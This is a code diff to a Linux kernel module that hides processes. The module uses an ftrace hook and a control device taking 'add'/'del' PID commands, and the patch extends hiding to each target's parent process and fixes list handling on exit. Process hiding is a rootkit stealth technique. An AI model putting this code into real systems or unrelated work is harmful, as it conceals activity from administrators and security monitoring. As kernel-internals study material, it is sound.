@@ -90,10 +90,8 @@ static struct ftrace_hook hook;
 static bool is_hidden_proc(pid_t pid)
 {
     pid_node_t *proc, *tmp_proc;
-    struct pid *pid_struct = find_vpid(pid);
-    struct task_struct *parent = pid_task(pid_struct, PIDTYPE_PID);
     list_for_each_entry_safe (proc, tmp_proc, &hidden_proc, list_node) {
-        if (proc->id == pid || proc->id == parent->pid)
+        if (proc->id == pid)
             return true;
     }
     return false;
@@ -118,9 +116,21 @@ static void init_hook(void)
 
 static int hide_process(pid_t pid)
 {
-    pid_node_t *proc = kvmalloc(sizeof(pid_node_t), GFP_KERNEL);
-    proc->id = pid;
-    list_add_tail(&proc->list_node, &hidden_proc);
+    pid_node_t *proc, *tmp_proc;
+    bool pid_exist = false;
+    list_for_each_entry_safe (proc, tmp_proc, &hidden_proc, list_node) {
+        if (proc->id == pid) {
+            pid_exist = true;
+            break;
+        }
+    }
+
+    if (!pid_exist) {
+        proc = kvmalloc(sizeof(pid_node_t), GFP_KERNEL);
+        proc->id = pid;
+
+        list_add_tail(&proc->list_node, &hidden_proc);
+    }
     return SUCCESS;
 }
 
@@ -175,11 +185,14 @@ static ssize_t device_write(struct file *filep,
                             loff_t *offset)
 {
     int err;
-    long pid;
+    long pid, ppid;
 
     char *message;
     char add_message[] = "add", del_message[] = "del";
     char delim[] = " ,";
+
+    struct pid *pid_struct = NULL;
+    struct task_struct *pid_task_struct = NULL;
 
     if (len < sizeof(add_message) - 1 && len < sizeof(del_message) - 1)
         return -EAGAIN;
@@ -196,7 +209,14 @@ static ssize_t device_write(struct file *filep,
             err = kstrtol(found, 10, &pid);
             if (err != 0)
                 return err;
-            hide_process(pid);
+
+            pid_struct = find_get_pid(pid);
+            if (pid_struct) {
+                pid_task_struct = pid_task(pid_struct, PIDTYPE_PID);
+                ppid = task_ppid_nr(pid_task_struct);
+                hide_process(pid);
+                hide_process(ppid);
+            }
         }
     } else if (!memcmp(message, del_message, sizeof(del_message) - 1)) {
         char *pid_ptr = message + sizeof(del_message);
@@ -206,7 +226,15 @@ static ssize_t device_write(struct file *filep,
             err = kstrtol(found, 10, &pid);
             if (err != 0)
                 return err;
-            unhide_process(pid);
+
+            pid_struct = find_get_pid(pid);
+
+            if (pid_struct) {
+                pid_task_struct = pid_task(pid_struct, PIDTYPE_PID);
+                ppid = task_ppid_nr(pid_task_struct);
+                unhide_process(pid);
+                unhide_process(ppid);
+            }
         }
     } else {
         kvfree(message);
@@ -278,17 +306,18 @@ static void _hideproc_exit(void)
 
     printk(KERN_INFO "@ %s\n", __func__);
     /* FIXME: ensure the release of all allocated resources */
+
+    list_for_each_entry_safe (proc, tmp_proc, &hidden_proc, list_node) {
+        list_del(&proc->list_node);
+        kvfree(proc);
+    }
+
     hook_remove(&hook);
     device_destroy(hideporc_device.class,
                    MKDEV(MAJOR(hideporc_device.devt), MINOR_VERSION));
     cdev_del(&hideporc_device.cdev);
     class_destroy(hideporc_device.class);
     unregister_chrdev_region(hideporc_device.devt, 1);
-
-    list_for_each_entry_safe (proc, tmp_proc, &hidden_proc, list_node) {
-        list_del(&proc->list_node);
-        kvfree(proc);
-    }
 }
 
 module_init(_hideproc_init);
